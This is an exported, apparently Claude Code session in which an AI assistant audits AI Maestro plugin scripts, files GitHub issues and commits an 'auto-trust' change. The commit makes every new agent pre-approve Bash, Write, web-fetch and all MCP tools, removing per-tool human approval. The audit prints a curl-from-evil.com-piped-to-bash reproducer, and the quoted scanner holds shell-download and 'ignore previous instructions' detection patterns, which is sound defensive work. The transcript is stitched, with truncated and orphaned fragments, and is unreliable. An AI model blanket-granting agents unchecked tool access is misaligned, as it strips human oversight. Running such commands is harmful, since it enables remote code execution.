     1→# Code Correctness Report: PR #1 plugins

     5→**Files audited:** 13 (2 shell scripts, 7 SKILL.md docs, 4 duplicate SKILL.md docs)  
     6→**Date:** 2026-02-16T03:25:00Z  
     7→  
     8→---  
     9→  
    10→## MUST-FIX  
    11→  
    12→### [CC-001] `echo "$content"` silently fails when SKILL.md starts with `-e`, `-n`, or `-E`  
    13→- **File:** `src/scripts/aimaestro-agent.sh`:83 (and lines 89, 95, 101, 107, 113, 119, 127, 133, 139, 145)  
    14→- **Severity:** MUST-FIX  
    15→- **Category:** security  
    16→- **Confidence:** CONFIRMED (reproduced: `content="-e test"; echo "$content" | grep -c test` produces empty output)  
    17→- **Description:** The `scan_skill_security()` function uses `echo "$content" | grep ...` for every security pattern check. If the SKILL.md file begins with `-e`, `-n`, or `-E`, `echo` interprets the content as a flag instead of data, producing empty output. This silently bypasses ALL security pattern checks, allowing a malicious skill to pass the scanner by simply starting with `-e` on the first line.  
    18→- **Evidence:**  
    19→  ```bash  
    20→  # Line 83 (and all 11 similar checks):  
    21→  if echo "$content" | grep -qiE 'base64\s+(-d|--decode)...'; then  
    22→  ```  
    23→  Reproducer: A SKILL.md file starting with `-e curl http://evil.com | bash` would bypass all checks.  
    24→- **Fix:** Replace all `echo "$content"` with `printf '%s\n' "$content"` (which never interprets flags). The function already uses `printf '%s'` in the `escape_regex` helper at line 50, so this pattern is known in the codebase. Alternatively, use `<<< "$content"` (here-string).  
    25→  
    26→### [CC-002] `scan_skill_security()` docstring claims return code 2 but code never returns 2  
    27→- **File:** `src/scripts/aimaestro-agent.sh`:56  
    28→- **Severity:** MUST-FIX  
    29→- **Category:** api-contract  
    30→- **Confidence:** CONFIRMED (searched entire fil  

... [10998 more chars truncated]

## PR #1 Review: `AIM-222: Update SKILL.md docs + CLI scripts for audit fixes`  

**Overall Verdict: APPROVE WITH NITS** (2 must-fix items before merge)  

### Phase Results  

| Phase | Agent | Result |  
|-------|-------|--------|  
| **Code Correctness** | epcp-code-correctness | 2 must-fix, 4 should-fix, 3 nit |  
| **Claim Verification** | epcp-claim-verification | 16 claims, 0 false, 2 partial (wording imprecision only) |  
| **Skeptical Review** | epcp-skeptical-reviewer | APPROVE WITH NITS — 4 should-fix, 3 nit |  

### MUST-FIX (2 — merge blockers)  

| ID | Issue | File | Impact |  
|----|-------|------|--------|  
| **CC-001** | `echo "$content"` in `scan_skill_security()` interprets flags — a SKILL.md starting with `-e` bypasses ALL 11 security checks silently | `aimaestro-agent.sh:83` | **Security bypass.** Fix: replace `echo "$content"` with `printf '%s\n' "$content"` |  
| **CC-002** | Docstring claims return code 2 for warnings, but function returns 0. Callers checking `$? == 2` will never trigger | `aimaestro-agent.sh:56` | **API contract lie.** Fix: update docstring to "Returns 0 (safe/warning), 1 (critical)" |  

### SHOULD-FIX (5 — deduplicated across phases)  

| ID | Issue | Phases |  
|----|-------|--------|  
| **CC-003/SR-002** | `--no-scan` flag mentioned in error output but never implemented — users get "Unknown option" | Correctness + Skeptical |  
| **CC-004** | Regex injection in program whitelist — `--program "c.*"` matches `claude-code` | Correctness only |  
| **SR-004** | Comment says "Uses mcp-scan if available" but no mcp-scan code exists | Skeptical only |  
| **CC-005/SR-005** | Planning SKILL.md hardcodes `docs_dev/` in troubleshooting despite `AIMAESTRO_PLANNING_DIR` env var | Correctness + Skeptical |  
| **SR-001/CV-002** | "Both published and source copies in sync" claim is technically false — 4 files have intentional path divergence | Skeptical + Claim Verification |  

### Claim Verification Summary  

**16/16 claims verified** against actual code. The PR does what it says. Two minor wording imprecisions:  
- "All skills" have Helper Scripts — planning skill excluded (correctly, it has no helpers)  
- "In sync" — 4 files have intentional path differences (correct for each context)  

### Full Reports  

- `docs_dev/pr1-plugins-correctness-report.md`  
- `docs_dev/pr1-plugins-claim-verification-report.md`  
- `docs_dev/pr1-plugins-skeptical-review-report.md`  

The plugin worked as intended — all 3 agents ran in parallel and produced complementary findings with good cross-phase overlap on key issues. The **CC-001 echo flag injection** is the standout finding that only the code correctness agent caught.

### Verdict

EOF

## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 03:39:05]*


## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 03:39:14]*


## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 03:39:17]*

<div style="border-left: 4px solid #FFC107; padding-left: 12px; margin: 4px 0;">

Good catch — you're right to be concerned. Here's the situation:  

- **ai-maestro main repo**: merged our PR #206 + has newer commits. The submodule pointer in `main` references a commit on the plugin repo's `main` branch — which does NOT include our PR #1 fixes.  
- **plugin submodule locally**: currently on `fix/aim-222-skills-scripts` at `4bec57e` (our latest with all fixes).  

So if we run `git submodule update --remote`, it would reset the plugin to the upstream `main` — losing our fixes. The safe approach: pull the main repo but **leave the plugin submodule on our branch**.  

</div>

| #2 Null-field inbox | Fixed — full null/undefined validation in `convertAMPToMessage()` |  
| 10.3 amp-read.sh docs | Addressed |  
| 10.4 Planning output dir | Addressed |  

### Partially Fixed (2)  
| Issue | Description | Gap |  
|-------|-------------|-----|  
| #3 Reply routing | `in_reply_to` + `thread_id` implemented | No cached `reply_to` return address — replies re-resolve sender |  
| 10.1 Version consistency | `package.json`/`version.json` synced | CLI script still shows `v1.0.1` vs app `0.23.9` |  

### Not Fixed (6)  
| Priority | Issue | Description |  
|----------|-------|-------------|  
| **P1 Blocker** | #12 Manual trust | No auto-trust mechanism — every new agent needs manual tool approval |  
| **P2** | #3 reply_to | No cached return address for replies |  
| **P3** | 10.2 Script duplication | AMP scripts in 4 locations with different sizes — no single source of truth |  
| **P3** | 10.5 Changelog | No `CHANGELOG.md` exists |  
| **P3** | 10.6 Script size | `aimaestro-agent.sh` is 3,879 lines / 135 KB |  
| **P3** | 10.7 CLI args owner | `programArgs` and `owner` are separate top-level fields |  

### Not Implemented  
| Feature Request | Team-based communication isolation (open/closed teams, routing matrix, roles) |  

The P1 blocker (#12) is the most impactful — without auto-trust, every agent created via AI Maestro requires manual intervention. The proposed fix is straightforward: write `.claude/settings.local.json` with pre-approved permissions during agent creation.  

How do you want to proceed? Should I file GitHub issues for the unfixed items on `23blocks-OS/ai-maestro`, or would you like me to start working on fixes (starting with the P1 blocker)?  

</div>

## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 04:23:36]*

<div style="border-left: 4px solid #FFC107; padding-left: 12px; margin: 4px 0;">

Good question — some issues span both repos. Here's the breakdown:  

| Issue | Main Repo (`ai-maestro`) | Plugin Repo (`ai-maestro-plugins`) | Why |  
|-------|-------------------------|-----------------------------------|-----|  
| **#12 Manual trust** | API routes need to pass trust flags (`wake`, `create`, `session`) | `create_project_template()` in `agent-helper.sh` should write `.claude/settings.local.json` | Spans both |  
| **#3 Reply routing** | `lib/messageQueue.ts`, `lib/message-send.ts`, `lib/types/amp.ts` | `amp-reply.sh`, `amp-send.sh` | Spans both |  
| **10.1 Version consistency** | `package.json`, `version.json` | `aimaestro-agent.sh` has independent `v1.0.1` | Spans both |  
| **10.2 Script duplication** | — | AMP scripts in 4 locations in plugin tree | Plugin only |  
| **10.5 Changelog** | Project-level | — | Main only |  
| **10.6 Script size** | — | `aimaestro-agent.sh` (135 KB) | Plugin only |  
| **10.7 CLI args owner** | `types/agent.ts` | — | Main only |  

My recommendation: file each issue on the repo where the **primary fix** lives. For issues that span both, file on main and cross-reference the plugin repo in the description. That gives us:  

- **Main repo**: #12 (primary), #3, 10.1, 10.5, 10.7  
- **Plugin repo**: 10.2, 10.6  

Want me to go with this split?  

</div>

## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 04:24:28]*

<details>
<summary>🔧 Tool: Bash -- File issue #12 - Manual trust (main repo)</summary>

**Input:**

*File issue #12 - Manual trust (main repo)*  

```bash
gh issue create --repo 23blocks-OS/ai-maestro --label "bug,enhancement" --title "No auto-trust mechanism — every new agent requires manual tool approval" --body "$(cat <<'EOF'
## Problem

When AI Maestro creates a new agent (via CLI `create` or API `/api/sessions/create`, `/api/agents/[id]/wake`), the agent requires manual tool approval on first use. There is no mechanism to pre-approve tools during agent creation.

This is the **only remaining blocker** for fully automated agent provisioning.

## Evidence (v0.23.9)

| Component | File | Trust setup? |
|-----------|------|--------------|
| `cmd_create()` | `plugin/src/scripts/aimaestro-agent.sh:1058–1270` | **NO** — never writes `.claude/settings.local.json` |
| `create_project_template()` | `plugin/src/scripts/agent-helper.sh:277–431` | **NO** — creates `.claude/` dir, `CLAUDE.md`, `.gitignore`, `git init` but no permissions |
| Wake route | `app/api/agents/[id]/wake/route.ts` | **NO** — creates tmux session, sets AMP env vars, launches program — no trust config |
| Session create route | `app/api/sessions/create/route.ts` | **NO** — creates tmux session, registers agent — no permissions config |
| `createAgent()` | `lib/agent-registry.ts` | **NO** — pure data registration, no filesystem writes to settings |
| Docker create route | `app/api/agents/docker/create/route.ts` | Has `yolo` flag for `--dangerously-skip-permissions` — Docker-only, not a general mechanism |

Global search: no code anywhere writes trust rules to an agent's working directory.

## Proposed Fix

### Option A: Write settings during creation

`create_project_template()` in `agent-helper.sh` (plugin repo) should write `.claude/settings.local.json` into the agent's working directory:

```json
{  
  "permissions": {  
    "allow": [  
      "Bash(*)",  
      "Read(*)",  
      "Write(*)",  
      "Edit(*)",  
      "mcp__*"  
    ]  
  }  
}  
```

### Option B: Pass permission flags during launch

The wake/create API

## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 04:24:40]*

<details>
<summary>🔧 Tool: Bash -- File issue #3 - Reply routing (main repo)</summary>

**Input:**

*File issue #3 - Reply routing (main repo)*  

```bash
gh issue create --repo 23blocks-OS/ai-maestro --label "enhancement" --title "AMP reply routing lacks cached return address — replies re-resolve sender" --body "$(cat <<'EOF'
## Problem

When replying to an AMP message, the reply re-resolves the original sender's address via `resolveAgentIdentifier()`. If the sender has been renamed, moved hosts, or changed address since sending, the reply may fail silently.

## What's Implemented (v0.23.9)

| Aspect | Status |
|--------|--------|
| `in_reply_to` field in AMP envelope | Done (`lib/types/amp.ts:138`) |
| Thread tracking via `thread_id` | Done (`route/route.ts:390`) |
| `in_reply_to` propagated in forwarding | Done (`route/route.ts:188`) |
| `amp-reply.sh` uses `in_reply_to` correctly | Done |

## What's Missing

| Aspect | Status |
|--------|--------|
| Dedicated `reply_to` return-address field | NOT IMPLEMENTED |
| Cached/pre-resolved return routing | NOT IMPLEMENTED |
| Reply bypasses re-resolution | NO — replies still re-resolve |

## Current Reply Flow

1. `amp-reply.sh` reads original message from inbox
2. Extracts `envelope.from` from the original message
3. Calls `amp-send.sh` with that address as recipient
4. `amp-send.sh` → `sendFromUI()` → `resolveAgentIdentifier()` re-resolves the sender

## Proposed Fix

Add a `reply_to` field to the AMP envelope containing the sender's full routing info (`agent_id`, `address`, `host`) at send time. When handling a reply, use this cached address instead of re-resolving. Fall back to current resolution if `reply_to` is absent (backward compatibility).

### Files to modify

**Main repo:**
- `lib/types/amp.ts` / `lib/types/amp-message.ts` — add `reply_to` field to envelope type
- `lib/message-send.ts` — populate `reply_to` when building envelope
- `lib/messageQueue.ts` — use `reply_to` for reply routing

**Plugin repo:**
- `amp-reply.sh` — prefer `reply_to` from original message over `envelope.from`
- `amp-send.sh` — popula

... [158 more chars truncated]

**Result:**

Loading .zprofile at 04:24:48  
https://github.com/23blocks-OS/ai-maestro/issues/224  

</details>


## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 04:24:46]*

<details>
<summary>🔧 Tool: Bash -- File issue 10.1 - Version consistency (main repo)</summary>

**Input:**

*File issue 10.1 - Version consistency (main repo)*  

```bash
gh issue create --repo 23blocks-OS/ai-maestro --label "enhancement" --title "Version inconsistency: CLI script v1.0.1 vs app v0.23.9" --body "$(cat <<'EOF'
## Problem

The application version (`package.json`, `version.json`) is `0.23.9`, but the CLI script (`aimaestro-agent.sh`) reports `v1.0.1` via `--version`.

| Location | Version |
|----------|---------|
| `package.json` | `0.23.9` |
| `version.json` | `0.23.9` |
| `aimaestro-agent.sh` line 24 (comment) | `v1.0.1` |
| `aimaestro-agent.sh` --version output | `v1.0.1` |

## Question

Is the CLI script version intentionally independent from the app version? If not, the `bump-version.sh` script should also update the CLI version, or the CLI should read from `version.json`.

## Proposed Fix

If versioning should be unified:
1. Add `aimaestro-agent.sh` version line to `scripts/bump-version.sh`
2. Or have the CLI read version from a shared source

If versioning is intentionally separate:
1. Document this in CLAUDE.md under Version Management
2. Add the CLI version to `bump-version.sh` as a separate managed field

## Source

Identified in AIM-222 audit (10.1), verified partially addressed in v0.23.9.
EOF
)" 2>&1
```

## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 04:24:58]*

<details>
<summary>🔧 Tool: Bash -- File issue 10.5 - Changelog (main repo)</summary>

**Input:**

*File issue 10.5 - Changelog (main repo)*  

```bash
gh issue create --repo 23blocks-OS/ai-maestro --label "documentation" --title "No structured CHANGELOG.md — only narrative HISTORY.md" --body "$(cat <<'EOF'
## Problem

No `CHANGELOG.md` exists. `HISTORY.md` is a narrative development history last updated at v0.19.31 — not a structured per-version changelog. `version.json` points to GitHub Releases as the changelog mechanism, but releases are not consistently created.

## Proposed Fix

Create a `CHANGELOG.md` following [Keep a Changelog](https://keepachangelog.com/) format with sections: Added, Changed, Fixed, Removed, Security.

Optionally automate changelog generation from commit messages using conventional commits or GitHub Release notes.

## Source

AIM-222 audit (10.5), verified unaddressed in v0.23.9.
EOF
)" 2>&1
```

**Result:**

Loading .zprofile at 04:25:24  
https://github.com/23blocks-OS/ai-maestro/issues/226  

</details>


## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 04:25:04]*

<details>
<summary>🔧 Tool: Bash -- File issue 10.7 - CLI args owner (main repo)</summary>

**Input:**

*File issue 10.7 - CLI args owner (main repo)*  

```bash
gh issue create --repo 23blocks-OS/ai-maestro --label "enhancement" --title "Agent type: programArgs and owner are separate top-level fields" --body "$(cat <<'EOF'
## Problem

In `types/agent.ts`, `programArgs` (line 456) and `owner` (line 186) are separate top-level fields on the Agent type. There is no association between who set the program args and what they are. This makes it unclear whether args were set by the user, by AI Maestro, or by another agent.

## Current State

```typescript
// types/agent.ts  
programArgs?: string   // line 456  
owner?: string         // line 186  
```

## Proposed Fix

Consider grouping related launch configuration into a structured object:

```typescript
launchConfig?: {  
  program: string  
  args?: string  
  owner?: string        // who configured this  
  trustLevel?: 'full' | 'standard' | 'restricted'  
}  
```

This would also support Issue #223 (auto-trust mechanism) by providing a place to specify trust level during creation.

## Source

AIM-222 audit (10.7), verified unaddressed in v0.23.9.
EOF
)" 2>&1
```

**Result:**

Loading .zprofile at 04:25:26  
https://github.com/23blocks-OS/ai-maestro/issues/227  

</details>


## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 04:25:15]*

<details>
<summary>🔧 Tool: Bash -- File issue 10.2 - Script duplication (plugin repo)</summary>

**Input:**

*File issue 10.2 - Script duplication (plugin repo)*  

```bash
gh issue create --repo 23blocks-OS/ai-maestro-plugins --label "bug" --title "AMP scripts exist in 4 locations with divergent sizes — no single source of truth" --body "$(cat <<'EOF'
## Problem

AMP scripts exist in **4 locations** with **different file sizes**, meaning 3 distinct versions coexist:

| Script | ~/.local/bin/ | scripts/ | plugins/amp-messaging/scripts/ | plugin/plugins/ai-maestro/scripts/ |
|--------|--------------|----------|-------------------------------|-------------------------------------|
| amp-inbox.sh | 4,811 B | 8,841 B | 4,537 B | 4,811 B |
| amp-send.sh | 29,965 B | 5,179 B | 13,510 B | 29,965 B |
| amp-read.sh | 7,487 B | N/A | 5,338 B | 7,487 B |
| amp-reply.sh | 3,996 B | N/A | 3,299 B | 3,996 B |
| amp-register.sh | 12,445 B | 10,132 B | 11,500 B | 12,445 B |

## Impact

- Bug fixes applied to one location don't propagate to others
- Users may get different behavior depending on which script is on their PATH
- Security fixes (like the CC-001 printf fix from PR #1) must be applied in multiple places manually

## Proposed Fix

1. Establish `plugin/plugins/ai-maestro/scripts/` as the single source of truth
2. `install-messaging.sh` copies from there to `~/.local/bin/` — this already works
3. Remove or symlink the `scripts/` and `plugins/amp-messaging/scripts/` copies
4. Add a CI check that no AMP script diverges from the canonical location

## Source

AIM-222 audit (10.2), verified worsened in v0.23.9 (now 4 locations vs 3 originally).
EOF
)" 2>&1
```

**Result:**

Loading .zprofile at 04:25:27  
https://github.com/23blocks-OS/ai-maestro-plugins/issues/2  

</details>


## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 04:25:24]*

<details>
<summary>🔧 Tool: Bash -- File issue 10.6 - Script size (plugin repo)</summary>

**Input:**

*File issue 10.6 - Script size (plugin repo)*  

```bash
gh issue create --repo 23blocks-OS/ai-maestro-plugins --label "enhancement" --title "aimaestro-agent.sh is 3,879 lines / 135 KB — should be split into modules" --body "$(cat <<'EOF'
## Problem

`src/scripts/aimaestro-agent.sh` is 3,879 lines (135,448 bytes). This makes it difficult to:
- Review changes in PRs
- Find specific functionality
- Test individual commands
- Onboard new contributors

The script handles agent CRUD, session management, plugin/skill installation, security scanning, AMP messaging integration, and more — all in a single file.

## Proposed Fix

Split into focused modules following the existing `agent-helper.sh` pattern:

```
src/scripts/  
  aimaestro-agent.sh          # Main dispatcher (< 200 lines) — parses args, sources modules  
  agent-commands.sh            # create, delete, list, show, rename, update  
  agent-session.sh             # wake, hibernate, session management  
  agent-install.sh             # skill-install, plugin-install, marketplace  
  agent-security.sh            # scan_skill_security, ToxicSkills defense  
  agent-helper.sh              # Existing helper (template creation, utilities)  
```

Each module would be sourced by the main script. Commands would dispatch to the appropriate module.

## Metrics

| Current | Target |
|---------|--------|
| 1 file, 3,879 lines | 6 files, ~650 lines each |
| 135 KB single file | ~22 KB average per module |

## Source

AIM-222 audit (10.6), verified unchanged in v0.23.9.
EOF
)" 2>&1
```

**Result:**

Loading .zprofile at 04:25:29  
https://github.com/23blocks-OS/ai-maestro-plugins/issues/3  

</details>

## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 04:31:44]*

<details>
<summary>🔧 Tool: Edit -- `agent-helper.sh`</summary>

**Input:**

**File:** `/Users/emanuelesabetta/ai-maestro/plugin/src/scripts/agent-helper.sh`  

**Old:**  
```
    # HIGH-1/HIGH-2: Use atomic write pattern - write to temp file first, then mv
    local tmp_claude tmp_gitignore
    tmp_claude=$(mktemp) || {
        print_error "Failed to create temp file for CLAUDE.md"
        return 1
    }
```

**New:**  
```
    # Write .claude/settings.local.json with pre-approved tool permissions
    # so agents created by AI Maestro don't require manual tool approval (Issue #223)
    local tmp_settings
    tmp_settings=$(mktemp) || {
        print_error "Failed to create temp file for settings.local.json"
        return 1
    }

    cat > "$tmp_settings" << 'SETTINGS'
{
  "permissions": {
    "allow": [
      "Bash(*)",
      "Read(*)",
      "Write(*)",
      "Edit(*)",
      "Glob(*)",
      "Grep(*)",
      "WebFetch(*)",
      "WebSearch(*)",
      "Task(*)",
      "mcp__*"
    ]
  }
}
SETTINGS
    # shellcheck disable=SC2181
    if [[ $? -ne 0 ]]; then
        rm -f "$tmp_settings"
        print_error "Failed to write settings.local.json content"
        return 1
    fi

    mv "$tmp_settings" "$canonical_dir/.claude/settings.local.json" || {
        rm -f "$tmp_settings"
        print_error "Failed to create .claude/settings.local.json"
        return 1
    }

    # HIGH-1/HIGH-2: Use atomic write pattern - write to temp file first, then mv
    local tmp_claude tmp_gitignore
    tmp_claude=$(mktemp) || {
        print_error "Failed to create temp file for CLAUDE.md"
        return 1
    }
```

**Result:**

The file /Users/emanuelesabetta/ai-maestro/plugin/src/scripts/agent-helper.sh has been updated successfully.  

</details>

## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 04:32:25]*

<details>
<summary>🔧 Tool: Bash -- Commit auto-trust fix</summary>

**Input:**

*Commit auto-trust fix*  

```bash
cd /Users/emanuelesabetta/ai-maestro/plugin && git add plugins/ai-maestro/scripts/agent-helper.sh src/scripts/agent-helper.sh && git commit -m "$(cat <<'EOF'
feat: auto-trust mechanism — write settings.local.json during agent creation

Fixes #223 (23blocks-OS/ai-maestro#223)

When AI Maestro creates a new agent via `create_project_template()`, it now
writes `.claude/settings.local.json` with pre-approved tool permissions into
the agent's working directory. This eliminates the manual tool approval step
that previously blocked every newly created agent.

Pre-approved tools: Bash, Read, Write, Edit, Glob, Grep, WebFetch, WebSearch,
Task, and all MCP tools (mcp__*).

Note: The Claude Code "trust this folder" interactive prompt is separate from
tool permissions and still requires manual approval from the user via the
dashboard terminal. This is by design — project-level trust should be a
conscious human decision.

Implementation follows the existing atomic write pattern (write to tmpfile,
mv to destination) used for CLAUDE.md and .gitignore in the same function.
Both published (plugins/) and source (src/) copies updated in sync.
EOF
)" 2>&1
```

**Result:**

 2 files changed, 78 insertions(+)

## <span style="color:#FFC107">◇ ASSISTANT</span>  *[2026-02-16 04:32:43]*

<details>
<summary>🔧 Tool: Bash -- Create plugin repo PR</summary>

**Input:**

*Create plugin repo PR*  

```bash
gh pr create --repo 23blocks-OS/ai-maestro-plugins --head Emasoft:fix/auto-trust-and-verification-fixes --base main --title "feat: Auto-trust mechanism for AI Maestro agents (Issue #223)" --body "$(cat <<'EOF'
## Summary

- **Auto-trust**: `create_project_template()` now writes `.claude/settings.local.json` with pre-approved tool permissions into the agent's working directory during creation. This eliminates the manual tool approval step that blocked every newly created agent.

**1 file changed** (both published and source copies updated in sync)

### Pre-approved Tools

```json
{  
  "permissions": {  
    "allow": [  
      "Bash(*)", "Read(*)", "Write(*)", "Edit(*)",  
      "Glob(*)", "Grep(*)", "WebFetch(*)", "WebSearch(*)",  
      "Task(*)", "mcp__*"  
    ]  
  }  
}  
```

### What This Does NOT Fix

The Claude Code "trust this folder" interactive prompt is separate from tool permissions and still requires manual approval from the user via the dashboard terminal. This is by design — project-level trust should be a conscious human decision.

## Related Issues

- Closes 23blocks-OS/ai-maestro#223 (primary fix lives here in plugin repo)
- See also: 23blocks-OS/ai-maestro-plugins#2 (script dedup — deferred)
- See also: 23blocks-OS/ai-maestro-plugins#3 (script size — deferred)

## Companion PR

PR #1 on this repo addresses AIM-222 audit fixes (skill docs + security scanner). This PR is independent and can be merged separately.

## Test plan

- [ ] Create a new agent via `aimaestro-agent.sh create --name test-agent`
- [ ] Verify `.claude/settings.local.json` exists in the agent's working directory
- [ ] Verify the JSON content has the expected `permissions.allow` array
- [ ] Start Claude in the agent's directory — tool permissions should not prompt
- [ ] Verify the "trust this folder" prompt still appears (expected — manual approval)
EOF
)" 2>&1
```

**Result:**

https://github.com/23blocks-OS/ai-maestro-plugins/pull/4

  "offset": 23,
  "limit": 35
}
```

**Result:**

    23→yarn build               # Build optimized production bundle  
    24→yarn start               # Start production server (http://localhost:23000)  
    25→pm2 restart ai-maestro   # Restart production server via PM2  
    26→  
    27→# Testing  
    28→yarn test                # Run unit tests (vitest)  
    29→yarn test:watch          # Run tests in watch mode  
    30→  
    31→# Testing tmux sessions (for development)  
    32→tmux new-session -s test-session     # Create test session  
    33→tmux list-sessions                   # List all sessions (what the app discovers)  
    34→tmux kill-session -t test-session    # Clean up test session  
    35→```  
    36→  
    37→**Port Configuration:** The application is configured to run on port 23000. This is set in the PM2 configuration.  
    38→  
    39→**Health Check:** Do NOT use `/api/health` to check if the site is live (it doesn't exist). Use `/api/sessions` instead - it returns the list of agents and confirms the server is running.  
    40→  
    41→## Version Management  
    42→  
    43→**IMPORTANT:** When bumping the version, ALWAYS use the centralized script:  
    44→  
    45→```bash  
    46→./scripts/bump-version.sh patch    # 0.17.12 -> 0.17.13  
    47→./scripts/bump-version.sh minor    # 0.17.12 -> 0.18.0  
    48→./scripts/bump-version.sh major    # 0.17.12 -> 1.0.0  
    49→./scripts/bump-version.sh 1.0.0    # Set specific version  
    50→```  
    51→  
    52→This script updates ALL version references across the codebase:  
    53→- `version.json` (source of truth)  
    54→- `package.json`  
    55→- `scripts/remote-install.sh`  
    56→- `README.md` (badge)  
    57→- `docs/index.html` (schema + display)

    11→# AI Maestro Planning Skill

    13→## The Problem This Solves: EXECUTION  
    14→  
    15→This skill solves the **execution problem** - losing focus during complex tasks:  
    16→  
    17→| Problem | Symptom | This Skill Fixes It |  
    18→|---------|---------|---------------------|  
    19→| Goal drift | Forgot original objective after 50 tool calls | Re-read plan before decisions |  
    20→| Lost progress | Can't remember what phase I'm in | Phase tracking in task_plan.md |  
    21→| Repeated errors | Make same mistake twice | Error log prevents repetition |  
    22→| Session loss | Can't resume after /clear | Planning files persist on disk |  
    23→  
    24→**Note:** This is different from the Memory skill (which solves recall of past conversations). Planning solves staying focused NOW.  
    25→  
    26→---  
    27→  
    28→## Core Principle  
    29→  
    30→```  
    31→Context Window = RAM (volatile, limited, fast)  
    32→Filesystem = Disk (persistent, unlimited, explicit read required)  
    33→  
    34→Anything important gets written to disk.  
    35→```  
    36→  
    37→---  
    38→

Loading .zprofile at 03:24:44  
cmd_skill_install() {  
    local agent="" source="" scope="user" skill_name=""  

    while [[ $# -gt 0 ]]; do  
        case "$1" in  
            -s|--scope)  
                [[ $# -lt 2 ]] && { print_error "--scope requires a value"; return 1; }  
                scope="$2"; shift 2 ;;  
            --name)  
                [[ $# -lt 2 ]] && { print_error "--name requires a value"; return 1; }  
                skill_name="$2"; shift 2 ;;  
            -h|--help)  
                cat << 'HELP'  
Usage: aimaestro-agent.sh skill install <agent> <source> [options]  

Install a skill from a .skill file (zip archive) or a skill directory.  

Arguments:  
  agent    Agent name or ID  
  source   Path to .skill file (zip) or skill directory containing SKILL.md  

Options:  
  -s, --scope <user|project|local>   Install scope (default: user)  
  --name <name>                      Override skill folder name (default: derived  
                                     from source filename or directory name)  

Scopes:  
  user      ~/.claude/skills/<name>/ (all your projects)  
  project   <agent-dir>/.claude/skills/<name>/ (shared with collaborators)  
  local     <agent-dir>/.claude/skills/<name>/ (only you, gitignored)  

Source types:  
  .skill file    Zip archive containing SKILL.md and optional resources  
  directory      Folder containing SKILL.md at the top level  

Examples:  
  # Install .skill file to user scope (default)  
  aimaestro-agent.sh skill install my-agent ./my-skill.skill  

  # Install skill directory to project scope  
  aimaestro-agent.sh skill install my-agent ./path/to/skill-folder --scope project  

  # Install with custom name  
  aimaestro-agent.sh skill install my-agent ./downloads/v2-skill.skill --name my-skill  

  # Install to a specific agent's project (local scope)  
  aimaestro-agent.sh skill install backend-api ./debug-skill --scope local  
HELP  
                return 0 ;;  
            -*) print_error "Unknown option: $1"; return 1 ;;  
            *)  
                if [[ -z "$a

# ToxicSkills Security Scanner  
# Scans SKILL.md files for malicious patterns before installation.  
# Uses mcp-scan if available, falls back to built-in pattern checks.  
# Returns 0 (safe), 1 (critical - block), 2 (warning - proceed with caution)  
scan_skill_security() {  
    local skill_path="$1"  
    local skill_name="${2:-unknown}"  

    # Find SKILL.md in the given path  
    local skill_md=""  
    if [[ -f "$skill_path/SKILL.md" ]]; then  
        skill_md="$skill_path/SKILL.md"  
    elif [[ -f "$skill_path" ]] && [[ "$skill_path" == *.md ]]; then  
        skill_md="$skill_path"  
    fi  

    if [[ -z "$skill_md" ]]; then  
        print_warning "No SKILL.md found to scan at: $skill_path"  
        return 0  
    fi  

    local content  
    content=$(cat "$skill_md" 2>/dev/null) || return 0  

    local has_critical=false  
    local has_warning=false  

    # --- CRITICAL PATTERNS (block installation) ---  

    # 1. Base64 decode piped to execution  
    if echo "$content" | grep -qiE 'base64\s+(-d|--decode).*\|\s*(bash|sh|eval|source)|echo\s+.*\|\s*base64\s+(-d|--decode)'; then  
        print_error "CRITICAL: Obfuscated command execution detected (base64 decode + pipe to shell)"  
        has_critical=true  
    fi  

    # 2. curl/wget piped to shell  
    if echo "$content" | grep -qiE '(curl|wget)\s+.*\|\s*(bash|sh|sudo\s+bash|eval|source)'; then  
        print_error "CRITICAL: Remote code execution pattern detected (curl/wget piped to shell)"  
        has_critical=true  
    fi  

    # 3. Password-protected archives  
    if echo "$content" | grep -qiE 'unzip\s+-P\s|7z\s+x\s+-p|tar.*--passphrase'; then  
        print_error "CRITICAL: Password-protected archive extraction detected (AV evasion technique)"  
        has_critical=true  
    fi  

    # 4. DAN-style jailbreak / developer mode injection  
    if echo "$content" | grep -qiE 'ignore\s+(previous|all|prior)\s+instructions|developer\s+mode|DAN\s+mode|safety\s+(warnings?  

... [2578 more chars truncated]  

</details>

to:  
`# Built-in pattern checks for common attack vectors.`

`if [[ ! " $allowed_programs " =~ [[:space:]]${program_lower}[[:space:]] ]]; then`  
to:

   370→  
   371→**Command:**  
   372→```bash  
   373→aimaestro-agent.sh restart <agent> [--wait <seconds>]  
   374→```  
   375→  
   376→**What it does:**  
   377→- Hibernates the agent, waits, then wakes it  
   378→- Useful after installing plugins or marketplaces that require a restart  
   379→- Verifies the agent comes back online after restart  
   380→  
   381→**Parameters:**  
   382→- `<agent>` - Agent name or ID (cannot be the current session)  
   383→- `--wait <seconds>` - Wait time between hibernate and wake (default: 3)

## <span style="color:#FF9800">◈ SUB-AGENT</span>  *[2026-02-16 03:25:13]*

<details>
<summary>🔧 Tool: Read -- `SKILL.md`</summary>

**Input:**

```json

**Result:**

    90→| `hybrid` (default) | General search, best for most cases |  
    91→| `semantic` | Looking for related concepts, different wording |  
    92→| `term` | Looking for exact function/class names |  
    93→| `symbol` | Looking for code symbols mentioned |  
    94→  
    95→### Symbol Mode Examples  
    96→  
    97→The `symbol` mode is optimized for finding code symbols (function names, class names, variable names) mentioned in past conversations. Unlike `term` mode which does exact text matching, `symbol` mode understands code identifiers and matches them across different contexts.  
    98→  
    99→```bash  
   100→# Find discussions where a specific function was mentioned  
   101→memory-search.sh "processPayment" --mode symbol  
   102→  
   103→# Find conversations about a class  
   104→memory-search.sh "AuthenticationService" --mode symbol  
   105→  
